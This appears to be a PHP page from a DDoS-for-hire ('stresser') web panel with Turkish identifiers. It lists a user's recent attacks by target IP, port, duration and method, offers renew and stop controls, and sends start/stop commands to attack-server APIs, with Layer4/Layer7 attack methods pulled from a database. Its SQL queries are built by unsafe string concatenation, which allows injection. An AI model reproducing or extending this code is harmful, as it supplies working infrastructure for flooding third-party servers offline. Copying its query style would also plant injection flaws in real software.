									$saxo = 0;
									while ($saaServers = mysqli_fetch_array($saaLogs)) {
										$saaServer = $saaServers["sunucu"];
										$saaHost = $saaServers["ip"];
										$saaPort = $saaServers["port"];
										$saaTime = $saaServers["time"];
										$saaId = $saaServers["id"];
										$saxo++;

										$saaServerQuery = @mysqli_query($baglanti, "select * from sunucular where id='" . $saaServer . "'");
										$saaServerData = mysqli_fetch_array($saaServerQuery);

										@file_get_contents($saaServerData["api"] . "&host=" . $saaHost . "&port=" . $saaPort . "&time=" . $saaTime . "&method=STOP&node=VIP&id=" . $saaId);
										@file_get_contents($saaServerData["api"] . "&host=" . $saaHost . "&port=" . $saaPort . "&time=" . $saaTime . "&method=STOP&node=Free&id=" . $saaId);

										$baglanti->query("UPDATE log SET sonlanma = '$saaTarih' WHERE id='$saaId'");
									}
									header("Location: hub?process=aStopped&total=" . $saxo);
								}
								?>

								<button type="submit" value="1" name="stopAllAttacks" class="btn btn-danger" style="font-size: 12px !important; padding: 3px 6px !important; position: absolute !important; right: 20px !important">Stop All Attacks</button>
							</form>
						</span>

					</div>

					<div class="widget-content">
						<table class="table">
							<thead>
								<tr>
									<th>
										<div class="th-content" style="color:#b5b5c3;text-align:center!important;">IP / Port</div>
									</th>
									<th>
										<div class="th-content th-heading" style="color:#b5b5c3;text-align:center!important;">Time</div>
									</th>
									<th>
										<div class="th-content" style="color:#b5b5c3;text-align:center!important;">Method</div>
									</th>
									<th>
										<div class="th-content" style="color:#b5b5c3;text-align:center!important;">Status</div>
									</th>
									<th>
										<div class="th-content" style="color:#b5b5c3;text-align:center!important;">Action</div>
									</th>
								</tr>
							</thead>
							<tbody id="tabloliste" style="text-align:center!important;">
								<?php

								$data = mysqli_query($baglanti, "select * from log where user='$userid' ORDER BY id DESC LIMIT 15");
								while ($satir = mysqli_fetch_array($data)) {
									$tarih1 = strtotime($satir["sonlanma"]);
									$tarih2 = strtotime(date("Y-m-d H:i:s"));
									$fark = $tarih1 - $tarih2;
									if ($fark < 0) {
										$fark = 0;
									}
									if (strtotime($satir["sonlanma"]) < strtotime(date("Y-m-d H:i:s"))) { ?>
										<tr>
										<?php } else { ?>
										<tr style="background-color:rgba(28, 15, 69)">
										<?php  }
										?>

										<td>
											<div class="td-content product-name">
												<?php echo $satir["ip"]; ?>:<?php echo $satir["port"]; ?></div>
										</td>
										<td>
											<div class="td-content"><span class="discount-pricing"><?php if (strtotime($satir["sonlanma"]) < strtotime(date("Y-m-d H:i:s"))) { ?><?php echo $satir["sure"]; ?><?php } else { ?>
													<?php echo $fark ?><?php } ?> </span></div>
										</td>
										<td>
											<div class="td-content"><?php echo $satir["method"]; ?></div>
										</td>
										<td>
											<div class="td-content">
												<?php if (strtotime($satir["sonlanma"]) < strtotime(date("Y-m-d H:i:s"))) { ?>
													Expired
												<?php } else { ?>
													Running
												<?php  } ?>
											</div>
										</td>
										<td>
											<div class="td-content" style="text-align:center!important;">
												<?php if (strtotime($satir["sonlanma"]) < strtotime(date("Y-m-d H:i:s"))) { ?>
													<a href="?renew=<?php echo $satir["id"]; ?>"> <span class="badge badge-success"> <i class="fa fa-refresh" aria-hidden="true"></i> </span></a>
												<?php } else { ?>
													<a href="?stop=<?php echo $satir["id"]; ?>"> <span class="badge badge-danger"> <i class="fa fa-stop-circle"></i> </span></i></a>
												<?php  } ?>
											</div>
										</td>
										</tr>
									<?php
								}

									?>

							</tbody>
						</table>
					</div>
				</div>
			</div>
		</div>
	</div>
	<?php include("footer.php"); ?>
</div>
<script type="text/javascript">
	<?php
	$data2 = mysqli_query($baglanti, "select * from method where kate='Layer7' and node!='Free' ORDER BY id ASC");
	$l7methodsx = "";
	while ($satir2 = mysqli_fetch_array($data2)) {
		$l7methodsx = $l7methodsx . '"' . $satir2["deger"] . '", ';
	}
	$data23 = mysqli_query($baglanti, "select * from method where kate!='Layer7' and node!='Free' ORDER BY id ASC");
	$l4methodsx = "";
	while ($satir23 = mysqli_fetch_array($data23)) {
		$l4methodsx = $l4methodsx . '"' . $satir23["deger"] . '", ';
	}
	?>
	var layer7 = [<?= substr($l7methodsx, 0, -2) ?>]
	var layer4 = [<?= substr($l4methodsx, 0, -2) ?>]
	$(document).ready(() => {
		if (layer4.length <= 0) {
			if (layer7.length >= 1) {
				$("#port").hide();
				$("#host").attr("placeholder", "https://example.com");
			}
		}
	})
	$("#method").on("change", function() {
		if (layer7.includes(this.value)) {
			$("#port").hide();
			$("#host").attr("placeholder", "https://example.com");
			//console.log("Layer7 method selected")
		} else {
			$("#port").show();
			$("#host").attr("placeholder", "IP Address");
		}
	})
	var ipv4Regex = /^(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)){3}$/gm;
	$("#host").on("paste", function(e) {
		if (e.originalEvent.clipboardData.getData("text").split(":").length == 2) {
			var host = e.originalEvent.clipboardData.getData("text").split(":")[0]
			var port = e.originalEvent.clipboardData.getData("text").split(":")[1]
			if (ipv4Regex.test(host)) {
				setTimeout(() => {
					$("#host").val(host)
					$("#portInput").val(port)
					$("#surezbircir").focus()
				}, 100)
			}
		}
	})

	function getLastAttacks() {
		$.ajax({
			"url": "/panel/ajax",
			"method": "POST",
			"data": {
				"sonsaldırı": 1
			},
			"success": function(data) {
				$("#tabloliste").html(data);
			},
			"error": function() {
				console.log("hata")
			}
		})
	}
	getLastAttacks()
	setInterval('getLastAttacks()', 1000);
</script>